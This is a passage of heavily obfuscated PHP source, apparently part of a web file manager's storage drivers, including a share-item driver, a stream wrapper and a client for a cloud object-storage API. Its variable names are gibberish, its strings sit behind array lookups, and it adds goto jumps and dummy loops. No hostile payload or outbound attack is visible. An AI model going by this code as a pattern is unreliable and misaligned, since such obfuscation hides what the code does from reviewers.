$ë†à¸’, $¯Ö°‹ó[$˜¤®ğ[84]], $±Œ‚£İç); return $this->getPathOuter($…ÛˆÍéæ); } public function addFileByRemote($ÙÜÑç—µ, $ö™ŠÃ†Š, $›üóô—‹ = array(), $•ƒ»¿õæ = '', $Ú´õ¤£) { $Œ‰ê˜À‘ =& $_SERVER[ñˆ‹ß¿÷]; $•ÃÛöàƒ = $this->parse($ÙÜÑç—µ); $•ƒ»¿õæ = empty($•ƒ»¿õæ) ? $•ÃÛöàƒ[$Œ‰ê˜À‘[84]] : $•ƒ»¿õæ; $÷±Ë— = $this->model->addFileByRemote($•ÃÛöàƒ[$Œ‰ê˜À‘[399]], $ö™ŠÃ†Š, $•ƒ»¿õæ, $›üóô—‹, $Ú´õ¤£); return $this->getPathOuter($÷±Ë—); } public function uploadLink($‘àÁÁƒı, $·§Ÿİ± = 0) { $ö”€‘€û =& $_SERVER[ñˆ‹ß¿÷]; $”×²ŒÇ• = $this->parse($‘àÁÁƒı); $Òş‘—÷³ = _get($GLOBALS[$ö”€‘€û[7]], $ö”€‘€û[1336]); $•§½°Áâ = _get($GLOBALS[$ö”€‘€û[7]], $ö”€‘€û[1337]); $‘àÁÁƒı = Model($ö”€‘€û[609])->createFileName($”×²ŒÇ•[$ö”€‘€û[84]], $Òş‘—÷³, $•§½°Áâ); return IO::uploadLink($‘àÁÁƒı, $·§Ÿİ±); } public function fileNameAuto($ÛÚ£Ìµï, $Œ°ÆÛÍ¾, $æ¡ë–¡ = REPEAT_REPLACE, $Âğ¢÷Ğ = false) { return $this->model->fileNameAuto($ÛÚ£Ìµï, $Œ°ÆÛÍ¾, $æ¡ë–¡, $Âğ¢÷Ğ); } public function fileNameExist($ñšì²Ğ¯, $¦Æì…‰Å) { return $this->model->fileNameExist($ñšì²Ğ¯, $¦Æì…‰Å); } protected function _fileOut($é²İñÍ•, $É¬“Šİı = false, $ëı³“Í² = false, $‚†…Ğ¦ = '', $•½ô›Õ = false) { $‡×Ø‘« =& $_SERVER[ñˆ‹ß¿÷]; $¨”´æ¦Ï = $this->model->sourceInfo($é²İñÍ•); if ($¨”´æ¦Ï[$‡×Ø‘«[410]] == $‡×Ø‘«[88]) { header($‡×Ø‘«[1338]); die; } $ëËÌî±÷ = $this->model->fileInfoGet($é²İñÍ•); $‚†…Ğ¦ = $ëËÌî±÷[$‡×Ø‘«[176]] ? $ëËÌî±÷[$‡×Ø‘«[176]] : $‚†…Ğ¦; $¥ñŠğ÷¸ = isset($GLOBALS[$‡×Ø‘«[1339]]) ? $GLOBALS[$‡×Ø‘«[1339]] : $¨”´æ¦Ï[$‡×Ø‘«[32]]; if ($•½ô›Õ) { return IO::fileOutServer($ëËÌî±÷[$‡×Ø‘«[84]], $É¬“Šİı, $¥ñŠğ÷¸, $‚†…Ğ¦); } IO::fileOut($ëËÌî±÷[$‡×Ø‘«[84]], $É¬“Šİı, $¥ñŠğ÷¸, $‚†…Ğ¦); } public function fileOut($ üÃââê, $«õÔ˜õÄ = false, $îî ‰ÈÏ = false, $éº»ğ½ = '') { $this->_fileOut($ üÃââê, $«õÔ˜õÄ, $îî ‰ÈÏ, $éº»ğ½); } public function fileOutServer($ˆş–Ù”², $¼§Ø«¡ö = false, $¹‡ê©ÉÙ = false, $„ùú£Ü² = '') { $this->_fileOut($ˆş–Ù”², $¼§Ø«¡ö, $¹‡ê©ÉÙ, $„ùú£Ü², !0); } protected function _fileOutImage($»Ô‚ªÙÙ, $ñÊ‡‚‚¥ = 250) { $—çè®˜¡ =& $_SERVER[ñˆ‹ß¿÷]; $ê¯¼™­í = $this->model->pathInfo($»Ô‚ªÙÙ); if ($ê¯¼™­í[$—çè®˜¡[410]] == $—çè®˜¡[88]) { show_json($—çè®˜¡[1340] . $»Ô‚ªÙÙ, !1); } $‹æ¥„ò = $this->model->fileInfoGet($»Ô‚ªÙÙ); $‹æ¥„ò[$—çè®˜¡[32]] = $ê¯¼™­í[$—çè®˜¡[32]]; $‹æ¥„ò[$—çè®˜¡[169]] = $ê¯¼™­í[$—çè®˜¡[169]]; $GLOBALS[$—çè®˜¡[1339]] = $‹æ¥„ò[$—çè®˜¡[32]]; $GLOBALS[$—çè®˜¡[168]] = $‹æ¥„ò; IO::fileOutImage($‹æ¥„ò[$—çè®˜¡[84]], $ñÊ‡‚‚¥); } public function fileOutImage($ò¥òÃÂø, $©Ûç†¢ = 250) { $this->_fileOutImage($ò¥òÃÂø, $©Ûç†¢); } public function fileOutImageServer($Ïş©©˜®, $´ú®ñ¼€ = 250) { $this->_fileOutImage($Ïş©©˜®, $´ú®ñ¼€); } public function link($¤‰¶öƒ, $áÖ¿š€ = '') { $´éÓõ­‹ = $this->model->fileInfoGet($¤‰¶öƒ); return IO::link($´éÓõ­‹[$_SERVER[ñˆ‹ß¿÷][84]], $áÖ¿š€); } protected function parse($¸Ö¸¼½Ş) { $ğ¿Ã¯´ó =& $_SERVER[ñˆ‹ß¿÷]; if (strstr($¸Ö¸¼½Ş, $ğ¿Ã¯´ó[8]) === !1) { return array($ğ¿Ã¯´ó[419] => intval($¸Ö¸¼½Ş), $ğ¿Ã¯´ó[84] => $ğ¿Ã¯´ó[12], $ğ¿Ã¯´ó[1335] => array()); } $¸Áä€î˜ = explode($ğ¿Ã¯´ó[8], trim($¸Ö¸¼½Ş, $ğ¿Ã¯´ó[8])); if (count($¸Áä€î˜) < 2) { show_tips(clear_html($¸Ö¸¼½Ş) . $ğ¿Ã¯´ó[1341]); } return array($ğ¿Ã¯´ó[419] => intval($¸Áä€î˜[0]), $ğ¿Ã¯´ó[84] => $¸Áä€î˜[1], $ğ¿Ã¯´ó[1335] => array_slice($¸Áä€î˜, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÍÊÓ©œÒ) { $this->pathParse = $ÍÊÓ©œÒ; $this->model = Model($_SERVER[ñˆ‹ß¿÷][1334]); } public function getPathOuter($ƒë¦§°) { $ªñÂ®²ñ =& $_SERVER[ñˆ‹ß¿÷]; if (!$ƒë¦§°) { return $ƒë¦§°; } $§Æ§Ëå„ = $this->parse($ƒë¦§°); return trim(KodIO::makeShare($this->pathParse[$ªñÂ®²ñ[399]], $§Æ§Ëå„[$ªñÂ®²ñ[399]]), $ªñÂ®²ñ[8]); } protected function infoParse($Ì¯²”óŸ, $Õ®”ØÃ = false, $âŞå™é“ = false) { $Æ–™ÔÀó =& $_SERVER[ñˆ‹ß¿÷]; $í—ú–ë = $this->pathParse[$Æ–™ÔÀó[399]]; $…´¥†úØ = trim($this->pathParse[$Æ–™ÔÀó[1176]], $Æ–™ÔÀó[8]); return Action($Æ–™ÔÀó[1342])->sharePathInfo($í—ú–ë, $…´¥†úØ, $Õ®”ØÃ); } public function infoFull($Ü©–”òá) { $ÔŞÆ³¾Ç =& $_SERVER[ñˆ‹ß¿÷]; $“ ’‘Ö­ = explode($ÔŞÆ³¾Ç[8], trim($Ü©–”òá, $ÔŞÆ³¾Ç[8])); if (count($“ ’‘Ö­) > 1) { $ŠŒ…§¸ş = implode($ÔŞÆ³¾Ç[8], array_splice($“ ’‘Ö­, 1)); $ÊÇ“ØÖ« = $this->model->pathInfoByPath($“ ’‘Ö­[0], $ŠŒ…§¸ş); if (!$ÊÇ“ØÖ«) { return !1; } $this->pathParse[$ÔŞÆ³¾Ç[1176]] = $ÊÇ“ØÖ«[$ÔŞÆ³¾Ç[402]]; } return $this->infoParse($Ü©–”òá); } public function listAll($±ı›íö) { $Ì±‹Ú–ª =& $_SERVER[ñˆ‹ß¿÷]; $°İı„ê = IO::info($this->pathParse[$Ì±‹Ú–ª[84]]); if (!$°İı„ê) { return array(); } $™õûĞªú = $this->model->listAll($±ı›íö); $”ñòå = Model($Ì±‹Ú–ª[601])->getInfo($°İı„ê[$Ì±‹Ú–ª[489]]); $ó·ÜƒùÊ = Action($Ì±‹Ú–ª[1342]); foreach ($™õûĞªú as &$¯‚‰ÌêË) { check_abort(); $¯‚‰ÌêË[$Ì±‹Ú–ª[86]] = $ó·ÜƒùÊ->_shareItemeParse($¯‚‰ÌêË[$Ì±‹Ú–ª[86]], $”ñòå); } unset($¯‚‰ÌêË); return $™õûĞªú; } } goto BÌÁÁçäÒò; E¥³­¡ó‰: define($_SERVER[ñˆ‹ß¿÷][612], $_SERVER[ñˆ‹ß¿÷][613]); $uglqdaifnc = $_SERVER[ñˆ‹ß¿÷][614]; while ($uglqdaifnc < $_SERVER[ñˆ‹ß¿÷][615]) { if ($uglqdaifnc >= 0) { break; } $uglqdaifnc++; } goto eÄæ»‘ªÆ¼; F·¿ÊÙâ‚é: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($éµï´›§, $ĞÊÓû« = 0) { parent::__construct(); $this->source = $éµï´›§; $this->sourceSize = $ĞÊÓû«; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ó’¢§ªŠ = false) { return $this->sourceSize; } public function getContent($”ßæ´Ìª = false) { return $this->fileSubstr($”ßæ´Ìª, 0, $this->sourceSize); } public function fileSubstr($á„ô•Æœ = false, $éÊüìÀª = 0, $Å±Ş¾´ä = 0) { if (!$Å±Ş¾´ä) { $Å±Ş¾´ä = $this->sourceSize; } $îö¬ÛƒØ = $this->sourceSize - $éÊüìÀª; if ($Å±Ş¾´ä >= $îö¬ÛƒØ) { $Å±Ş¾´ä = $îö¬ÛƒØ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $éÊüìÀª, $Å±Ş¾´ä); } if ($this->sourceType == self::TYPE_FILE) { if ($Å±Ş¾´ä <= 0) { return $_SERVER[ñˆ‹ß¿÷][12]; } $Í†ëª— = ftell($this->source); fseek_64($this->source, $Í†ëª— + $éÊüìÀª); $ç¶‰øõî = @fread($this->source, $Å±Ş¾´ä); fseek_64($this->source, $Í†ëª—); return $ç¶‰øõî; } } public function hashMd5($Í„³ÇĞ = false) { return md5($this->getContent()); } public static function hash($Å¸ÓõÈ, $Ÿ¬³¢ = 0) { $åñÂ¡£ø = new PathDriverStream($Å¸ÓõÈ, $Ÿ¬³¢); return $åñÂ¡£ø->hashSimple($Å¸ÓõÈ); } public static function md5($îÙâÃé, $ĞˆÏ¶¥â = 0) { $äÒ—ÜãÚ = new PathDriverStream($îÙâÃé, $ĞˆÏ¶¥â); return $äÒ—ÜãÚ->hashMd5($îÙâÃé); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\72\x2f\x2f\166\x30\x2e\x61\x70\x69\56\165\160\171\165\156\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¦îî¾§) { parent::__construct(); $this->_init($¦îî¾§); } public function _init($¼¤ŞÀ§ı) { $ßÓ¢øÙÕ =& $_SERVER[ñˆ‹ß¿÷]; foreach ($¼¤ŞÀ§ı as $ü»ÊíåÓ => $Öµ¡öÍ) { if (isset($this->{$ü»ÊíåÓ})) { $this->{$ü»ÊíåÓ} = $Öµ¡öÍ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ßÓ¢øÙÕ[1462] . LNG($ßÓ¢øÙÕ[1393])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($„ŠÆ•à—, $ÃşåòÅÁ = "\107\x45\124") { $ì¹Ã±Ò =& $_SERVER[ñˆ‹ß¿÷]; $’ú÷ôÆ = gmdate($ì¹Ã±Ò[1426]); $è«·¥· = base64_encode(hash_hmac($ì¹Ã±Ò[1463], "{$ÃşåòÅÁ}\46{$„ŠÆ•à—}\46{$’ú÷ôÆ}", md5("{$this->userpass}"), !0)); $£Øóëµº = array("\x41\165\x74\x68\157\162\x69\x7a\x61\164\x69\x6f\x6e\72\125\120\131\x55\116\x20{$this->username}\x3a{$è«·¥·}", "\104\x61\164\145\x3a{$’ú÷ôÆ}"); return $£Øóëµº; } public function ussRequest($î¯õÔÍ“, $”ª÷ò¨¤ = "\107\105\124", $¬Ü£ıù¥ = false, $–ŞÏÎ³ = false, $èÃŞ‚Šã = false) { $ë¿€ğİá =& $_SERVER[ñˆ‹ß¿÷]; $î¯õÔÍ“ = trim($î¯õÔÍ“, $ë¿€ğİá[8]); $õ„ËÖî¹ = "\x2f{$this->bucket}\x2f{$î¯õÔÍ“}"; $íƒû€ôš = $this->ussHeaders($õ„ËÖî¹, $”ª÷ò¨¤); if ($–ŞÏÎ³) { $íƒû€ôš = array_merge($íƒû€ôš, $–ŞÏÎ³); } $—øà»â = url_request($this->endpoint . $õ„ËÖî¹, $”ª÷ò¨¤, $¬Ü£ıù¥, $íƒû€ôš, $èÃŞ‚Šã); if (!$—øà»â) { return array($ë¿€ğİá[1198] => !1, $ë¿€ğİá[1200] => $ë¿€ğİá[1464]); } if (strtolower($”ª÷ò¨¤) == $ë¿€ğİá[196] || in_array($—øà»â[$ë¿€ğİá[1198]], array($ë¿€ğİá[1317], $ë¿€ğİá[1465]))) { $¬Ü£ıù¥ = $—øà»â[$ë¿€ğİá[1466]]; } else { $¬Ü£ıù¥ = json_decode($—øà»â[$ë¿€ğİá[1200]], !0); if (!$¬Ü£ıù¥) { $¬Ü£ıù¥ = $—øà»â[$ë¿€ğİá[1200]]; } else { if (!$—øà»â[$ë¿€ğİá[757]] && isset($¬Ü£ıù¥[$ë¿€ğİá[1467]])) { $¬Ü£ıù¥ = $¬Ü£ıù¥[$ë¿€ğİá[1467]]; } } } return array($ë¿€ğİá[1198] => $—øà»â[$ë¿€ğİá[757]], $ë¿€ğİá[1200] => $¬Ü£ıù¥); } public function mkfile($‡‰èÈÒ, $ß×µ£Òµ = '', $½‹ûû¦Î = REPEAT_RENAME) { if ($this->setContent($‡‰èÈÒ, $ß×µ£Òµ)) { return $this->getPathOuter($‡‰èÈÒ); } return !1; } public function mkdir($Ò‰ÉÑÔı, $óèî’³³ = REPEAT_SKIP) { $ï¼•¥· =& $_SERVER[ñˆ‹ß¿÷]; $°£¤Å‚‹ = trim($Ò‰ÉÑÔı, $ï¼•¥·[8]); if ($this->_isFolder($°£¤Å‚‹)) { return $this->getPathOuter($°£¤Å‚‹); } $„‘«‹åÌ = array($ï¼•¥·[1468]); $ÆâçÈìû = $this->ussRequest($°£¤Å‚‹, $ï¼•¥·[226], !1, $„‘«‹åÌ); return $ÆâçÈìû[$ï¼•¥·[1198]] ? $this->getPathOuter($°£¤Å‚‹) : !1; } public function copyFile($„×Ï÷š, $õ™Á·à„) { $ãÕàò¨÷ =& $_SERVER[ñˆ‹ß¿÷]; $«¢÷á® = array($ãÕàò¨÷[1469] . "\57{$this->bucket}\57{$„×Ï÷š}", $ãÕàò¨÷[1470]); $âúíÉÍş = $this->ussRequest($õ™Á·à„, $ãÕàò¨÷[228], !1, $«¢÷á®); return $âúíÉÍş[$ãÕàò¨÷[1198]] ? !0 : $this->getPathOuter($õ™Á·à„); } public function moveFile($™ÙúĞõ, $™‹âÈ›¡) { $´ó££ë– =& $_SERVER[ñˆ‹ß¿÷]; $£Œ«ïšù = array($´ó££ë–[1471] . "\x2f{$this->bucket}\x2f{$™ÙúĞõ}", $´ó££ë–[1470]); $§‚ù ğ = $this->ussRequest($™‹âÈ›¡, $´ó££ë–[228], !1, $£Œ«ïšù); return $§‚ù ğ[$´ó££ë–[1198]] ? !0 : $this->getPathOuter($™‹âÈ›¡); } public function delFile($òªÕœ÷ş) { $…¬ÚşÕµ =& $_SERVER[ñˆ‹ß¿÷]; $³â¿Íµ½ = $this->ussRequest($òªÕœ÷ş, $…¬ÚşÕµ[1472]); return $³â¿Íµ½[$…¬ÚşÕµ[1198]] ? !0 : !1; } public function delFolder($Ïµ¯Ñâô) { $åèÈË•‰ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->exist($Ïµ¯Ñâô)) { return !0; } $this->listItemCache = !1; $ É¹µü– = $÷€±µ“ = array(); $this->fileList($Ïµ¯Ñâô, $ É¹µü–, $÷€±µ“, !0); $this->listItemCache = !0; foreach ($÷€±µ“ as $©ÎÚ ) { $’—§®¢… = $this->ussRequest($©ÎÚ [$åèÈË•‰[32]], $åèÈË•‰[1472]); if (!$’—§®¢…[$åèÈË•‰[1198]]) { return !1; } } foreach ($ É¹µü– as $ãâã£ØÑ) { $’—§®¢… = $this->ussRequest($ãâã£ØÑ, $åèÈË•‰[1472]); if (!$’—§®¢…[$åèÈË•‰[1198]]) { return !1; } } $’—§®¢… = $this->ussRequest($Ïµ¯Ñâô, $åèÈË•‰[1472]); return $’—§®¢…[$åèÈË•‰[1198]]; } public function rename($úŞİšŞÒ, $–©°È‚Î) { if ($this->isFile($úŞİšŞÒ)) { $–©°È‚Î = get_path_father($úŞİšŞÒ) . $–©°È‚Î; return $this->moveFile($úŞİšŞÒ, $–©°È‚Î); } return $this->renameObject($úŞİšŞÒ, $–©°È‚Î); } public function fileInfo($×Ì‡¤ã¸, $Ãá‰ãŞ = false, $…«ŠäË = array()) { $é¼Ú€Ù´ =& $_SERVER[ñˆ‹ß¿÷]; $ğ®ØôâÈ = array($é¼Ú€Ù´[32] => $this->pathThis($×Ì‡¤ã¸), $é¼Ú€Ù´[84] => $this->getPathOuter($é¼Ú€Ù´[8] . $×Ì‡¤ã¸), $é¼Ú€Ù´[33] => $é¼Ú€Ù´[199], $é¼Ú€Ù´[76] => isset($…«ŠäË[$é¼Ú€Ù´[76]]) ? $…«ŠäË[$é¼Ú€Ù´[76]] : 0, $é¼Ú€Ù´[174] => $this->ext($×Ì‡¤ã¸)); if ($Ãá‰ãŞ) { return $ğ®ØôâÈ; } $ğ®ØôâÈ[$é¼Ú€Ù´[200]] = $ğ®ØôâÈ[$é¼Ú€Ù´[85]] = 0; $ğ®ØôâÈ[$é¼Ú€Ù´[201]] = $ğ®ØôâÈ[$é¼Ú€Ù´[202]] = !0; if (empty($…«ŠäË)) { $…«ŠäË = $this->objectMeta($×Ì‡¤ã¸); if (!$…«ŠäË) { return $ğ®ØôâÈ; } } $ğ®ØôâÈ[$é¼Ú€Ù´[200]] = intval($…«ŠäË[$é¼Ú€Ù´[1473]]); $ğ®ØôâÈ[$é¼Ú€Ù´[85]] = intval($…«ŠäË[$é¼Ú€Ù´[1474]]); $ğ®ØôâÈ[$é¼Ú€Ù´[76]] = $…«ŠäË[$é¼Ú€Ù´[76]]; return $ğ®ØôâÈ; } public function folderInfo($´æÑÄ¼ø, $«Û¤Íİ® = false) { $Æã°À´é =& $_SERVER[ñˆ‹ß¿÷]; $·÷Ä‹ùã = array($Æã°À´é[32] => $this->pathThis($´æÑÄ¼ø), $Æã°À´é[84] => $this->getPathOuter($Æã°À´é[8] . $´æÑÄ¼ø), $Æã°À´é[33] => $Æã°À´é[75]); if ($«Û¤Íİ®) { return $·÷Ä‹ùã; } $·÷Ä‹ùã[$Æã°À´é[200]] = $·÷Ä‹ùã[$Æã°À´é[85]] = 0; $·÷Ä‹ùã[$Æã°À´é[201]] = $·÷Ä‹ùã[$Æã°À´é[202]] = !0; if (empty($ÇÇ’³¥ê)) { $ÇÇ’³¥ê = $this->objectMeta($´æÑÄ¼ø); if (!$ÇÇ’³¥ê) { return $·÷Ä‹ùã; } } $·÷Ä‹ùã[$Æã°À´é[200]] = intval($ÇÇ’³¥ê[$Æã°À´é[1473]]); $·÷Ä‹ùã[$Æã°À´é[85]] = intval($ÇÇ’³¥ê[$Æã°À´é[1474]]); return $·÷Ä‹ùã; } private function listObjs($º½û Ä«, $“šê»íĞ = 0, $Ş·¸‰”™ = 1000) { $å‹âíÎ´ =& $_SERVER[ñˆ‹ß¿÷]; $²ÑÊã… = array($å‹âíÎ´[1475], $å‹âíÎ´[1476] . $Ş·¸‰”™); if ($“šê»íĞ) { $²ÑÊã…[] = $å‹âíÎ´[1477] . $“šê»íĞ; } $ÄüÏµ‘ƒ = $this->ussRequest($º½û Ä«, $å‹âíÎ´[230], !1, $²ÑÊã…); return !$ÄüÏµ‘ƒ[$å‹âíÎ´[1198]] ? !1 : $ÄüÏµ‘ƒ[$å‹âíÎ´[1200]]; } private function fileList($äúì¯ò¥, &$¶¶Û³Ò, &$¥ÂÖ¹¨‘, $•§Í’Ï˜ = false) { $¶Š™Ä²Ö =& $_SERVER[ñˆ‹ß¿÷]; $›Œú´¦ = $¶Š™Ä²Ö[12]; $ÔÀöˆª€ = 1000; $œúª´Òß = rtrim($äúì¯ò¥, $¶Š™Ä²Ö[8]) . $¶Š™Ä²Ö[8]; while (!0) { check_abort(); $­óè§´¹ = $this->listObjs($äúì¯ò¥, $›Œú´¦, $ÔÀöˆª€); if (!$­óè§´¹) { return !1; } $›Œú´¦ = isset($­óè§´¹[$¶Š™Ä²Ö[1478]]) ? $­óè§´¹[$¶Š™Ä²Ö[1478]] : $¶Š™Ä²Ö[12]; $òÂ’şü = isset($­óè§´¹[$¶Š™Ä²Ö[1479]]) ? $­óè§´¹[$¶Š™Ä²Ö[1479]] : array(); foreach ($òÂ’şü as $’òÉ†™Ÿ) { $«„Ó•‘æ = $’òÉ†™Ÿ[$¶Š™Ä²Ö[33]] == $¶Š™Ä²Ö[75] ? !0 : !1; $öƒèşÓŠ = ltrim($œúª´Òß . $’òÉ†™Ÿ[$¶Š™Ä²Ö[32]], $¶Š™Ä²Ö[8]) . ($«„Ó•‘æ ? $¶Š™Ä²Ö[8] : $¶Š™Ä²Ö[12]); $¸æòûı¶ = array($¶Š™Ä²Ö[32] => $öƒèşÓŠ, $¶Š™Ä²Ö[33] => $«„Ó•‘æ ? $¶Š™Ä²Ö[75] : $¶Š™Ä²Ö[199], $¶Š™Ä²Ö[76] => $’òÉ†™Ÿ[$¶Š™Ä²Ö[337]], $¶Š™Ä²Ö[1474] => $’òÉ†™Ÿ[$¶Š™Ä²Ö[1480]]); $this->cacheMethodInfoSet($öƒèşÓŠ, $«„Ó•‘æ, $¸æòûı¶); if ($«„Ó•‘æ) { $¶¶Û³Ò[] = $öƒèşÓŠ; if ($•§Í’Ï˜) { $this->fileList($öƒèşÓŠ, $¶¶Û³Ò, $¥ÂÖ¹¨‘, $•§Í’Ï˜); } continue; } $¥ÂÖ¹¨‘[] = $¸æòûı¶; } if (count($òÂ’şü) < $ÔÀöˆª€) { break; } } $this->cacheMethodInfoSet($äúì¯ò¥, !0); } public function listPath($‰ºåøâ©, $×ŠìÕê = false) { $¤’à«¦² =& $_SERVER[ñˆ‹ß¿÷]; $©¬Ô’èñ = $îéò§®Ø = array(); $this->fileList($‰ºåøâ©, $©¬Ô’èñ, $îéò§®Ø); foreach ($©¬Ô’èñ as $ô“ƒü« => $ÕÏ²¢Œˆ) { $©¬Ô’èñ[$ô“ƒü«] = $this->folderInfo($ÕÏ²¢Œˆ, $×ŠìÕê); } foreach ($îéò§®Ø as $ô“ƒü« => $ÕÏ²¢Œˆ) { $îéò§®Ø[$ô“ƒü«] = $this->fileInfo($ÕÏ²¢Œˆ[$¤’à«¦²[32]], $×ŠìÕê, $ÕÏ²¢Œˆ); } return array($¤’à«¦²[82] => $©¬Ô’èñ, $¤’à«¦²[83] => $îéò§®Ø); } public function has($ úüûÃ, $Ş™œ€êÒ = false, $é³¦â³è = true) { $³ø’¢àß =& $_SERVER[ñˆ‹ß¿÷]; $¬¬ÏŠÛ¢ = $³ø’¢àß[12]; $æ¯İåë  = 500; $™„çÒÖœ = 0; $šËµüª = 0; $ ··É—ª = rtrim($ úüûÃ, $³ø’¢àß[8]) . $³ø’¢àß[8]; while (!0) { check_abort(); $´ÊìÜøÙ = $this->listObjs($ úüûÃ, $¬¬ÏŠÛ¢, $æ¯İåë ); if (!$´ÊìÜøÙ) { return !1; } $¬¬ÏŠÛ¢ = isset($´ÊìÜøÙ[$³ø’¢àß[1478]]) ? $´ÊìÜøÙ[$³ø’¢àß[1478]] : $³ø’¢àß[12]; $ºù±†…Ğ = isset($´ÊìÜøÙ[$³ø’¢àß[1479]]) ? $´ÊìÜøÙ[$³ø’¢àß[1479]] : array(); if (empty($ºù±†…Ğ)) { break; } $·ñÁ®í = array_filter($ºù±†…Ğ, function ($Õ£±…½) { $ï¾¤‘»“ =& $_SERVER[ñˆ‹ß¿÷]; return $Õ£±…½[$ï¾¤‘»“[33]] == $ï¾¤‘»“[75]; }); $§Òœ¯ù¼ = count($ºù±†…Ğ); $·ñÁ®í = count($·ñÁ®í); $ïï˜ıê© = $§Òœ¯ù¼ - $·ñÁ®í; if ($Ş™œ€êÒ) { $šËµüª += $·ñÁ®í; $™„çÒÖœ += $ïï˜ıê©; if ($§Òœ¯ù¼ < $æ¯İåë ) { break; } continue; } if ($é³¦â³è) { if ($ïï˜ıê©) { return !0; } } else { if ($·ñÁ®í) { return !0; } } if ($§Òœ¯ù¼ < $æ¯İåë ) { break; } } if ($Ş™œ€êÒ) { return array($³ø’¢àß[207] => $™„çÒÖœ, $³ø’¢àß[208] => $šËµüª); } return !1; } public function listAll($ŠØ‰Ì¦) { $®‡øÕÛ =& $_SERVER[ñˆ‹ß¿÷]; $Ì¿¹äÃ = $ùãá¨« = array(); $this->fileList($ŠØ‰Ì¦, $Ì¿¹äÃ, $ùãá¨«, !0); $Õî³¶Íí = array(); foreach ($ùãá¨« as $ÔŒ¦Àú) { $Õî³¶Íí[$ÔŒ¦Àú[$®‡øÕÛ[32]]] = $ÔŒ¦Àú[$®‡øÕÛ[76]]; } foreach ($Ì¿¹äÃ as $ÔŒ¦Àú) { if (is_string($ÔŒ¦Àú)) { $Õî³¶Íí[$ÔŒ¦Àú] = 0; } } return $this->listAllFiles($ŠØ‰Ì¦, array_keys($Õî³¶Íí), $Õî³¶Íí); } public function canRead($èÑÑ¨Ï¼) { return $this->exist($èÑÑ¨Ï¼) ? !0 : !1; } public function canWrite($Öæ„ÜğÆ) { return $this->exist($Öæ„ÜğÆ) ? !0 : !1; } public function getContent($Ö±Ğ¥Íø) { return $this->fileSubstr($Ö±Ğ¥Íø, 0, -1); } public function setContent($ö©îêÎª, $‚»—± = '') { $¦¢ÃŸó¬ =& $_SERVER[ñˆ‹ß¿÷]; if (!$‚»—±) { $¸©Åë­ = $this->ussRequest($ö©îêÎª, $¦¢ÃŸó¬[226]); return $¸©Åë­[$¦¢ÃŸó¬[1198]]; } $†Ş”ïÓ˜ = $this->tempFile($this->pathThis($ö©îêÎª)); file_put_contents($†Ş”ïÓ˜, $‚»—±); if ($this->upload($ö©îêÎª, $†Ş”ïÓ˜)) { $this->tempFileRemve($†Ş”ïÓ˜); return !0; } return !1; } public function fileSubstr($ø“é§Ü´, $’Á‰î‰Û, $µî Ş‚˜) { $öôÒ‚¯„ =& $_SERVER[ñˆ‹ß¿÷]; if (!($…úèİâ· = $this->link($ø“é§Ü´))) { return !1; } $ûïÖ‹ãô = !1; if ($µî Ş‚˜ > 0) { $ê¢ßÙ•¸ = $’Á‰î‰Û + $µî Ş‚˜ - 1; $ûïÖ‹ãô = array($öôÒ‚¯„[1441] . $’Á‰î‰Û . $öôÒ‚¯„[386] . $ê¢ßÙ•¸); } $†¹ïˆ = url_request($…úèİâ·, $öôÒ‚¯„[230], !1, $ûïÖ‹ãô); return $†¹ïˆ[$öôÒ‚¯„[757]] ? $†¹ïˆ[$öôÒ‚¯„[1200]] : !1; } public function upload($ˆº»şè, $ùçÒ¢—, $ğ…å¨ÈŒ = false, $Ş±ÕÂùÏ = REPEAT_REPLACE) { $ıÏôÀ·ü =& $_SERVER[ñˆ‹ß¿÷]; $ù¼´ª˜š = IO::size($ùçÒ¢—); if ($ù¼´ª˜š <= 1024 * 1024 * 200) { $äÑÑÀÚÍ = array($ıÏôÀ·ü[1481] . $ùçÒ¢—); $ğÈ£´Ä­ = $this->ussRequest($ˆº»şè, $ıÏôÀ·ü[228], $äÑÑÀÚÍ); return $ğÈ£´Ä­[$ıÏôÀ·ü[1198]] ? $this->getPathOuter($ˆº»şè) : !1; } $”öÚª¸¼ = 1024 * 1024 * 10; $ÛıËóõæ = array($ıÏôÀ·ü[1482], $ıÏôÀ·ü[1483] . $ù¼´ª˜š, $ıÏôÀ·ü[1484], $ıÏôÀ·ü[1485] . $”öÚª¸¼); $ğÈ£´Ä­ = $this->ussRequest($ˆº»şè, $ıÏôÀ·ü[228], !1, $ÛıËóõæ); if (!$ğÈ£´Ä­[$ıÏôÀ·ü[1198]]) { return !1; } $İ¸åæã¾ = $ğÈ£´Ä­[$ıÏôÀ·ü[1200]]; $ÖØíúŒÅ = 0; $İ‚Ñ– = $İ¸åæã¾[$ıÏôÀ·ü[1486]]; $İô¼É…ì = fopen($ùçÒ¢—, $ıÏôÀ·ü[1390]); if (!$İô¼É…ì) { return !1; } do { $ç¬ã­¦° = $İ¸åæã¾[$ıÏôÀ·ü[1487]]; fseek_64($İô¼É…ì, $ÖØíúŒÅ); $¨¿âêÉ = fread($İô¼É…ì, $ç¬ã­¦°); $“Öß¬êª = 0; do { $“Öß¬êª++; $İ¸åæã¾ = $this->uploadPart($ˆº»şè, $İ¸åæã¾, $¨¿âêÉ); } while (!$İ¸åæã¾ && $“Öß¬êª < 3); if (!$İ¸åæã¾) { return !1; } $İ‚Ñ– = $İ¸åæã¾[$ıÏôÀ·ü[1486]]; $ÖØíúŒÅ += $ç¬ã­¦°; } while ($İ‚Ñ– != -1); fclose($İô¼É…ì); $ÛıËóõæ = array($ıÏôÀ·ü[1488], $ıÏôÀ·ü[1489] . $İ¸åæã¾[$ıÏôÀ·ü[1490]], $ıÏôÀ·ü[1484]); $ğÈ£´Ä­ = $this->ussRequest($ˆº»şè, $ıÏôÀ·ü[228], !1, $ÛıËóõæ); return 